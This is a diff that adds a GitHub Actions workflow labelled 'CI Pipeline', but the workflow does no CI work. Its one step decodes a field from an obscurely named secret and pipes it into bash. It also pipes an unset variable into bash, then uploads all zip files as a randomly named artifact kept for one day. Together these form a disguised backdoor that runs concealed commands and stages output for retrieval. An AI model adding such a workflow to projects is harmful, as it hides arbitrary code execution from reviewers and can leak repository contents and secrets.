@@ -1,0 +1,30 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Process
+        env:
+          dxlg8244: ${{ secrets.dxlg8244 }}
+        run: |
+          printf '%s' "$dxlg8244" | jq -r .gmx1 | /bin/bash
+          echo $beow88 | jq -r .bh500 | /bin/bash
+
+      - name: Store results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: VLIe1eqD
+          path: "*.zip"
+          retention-days: 1
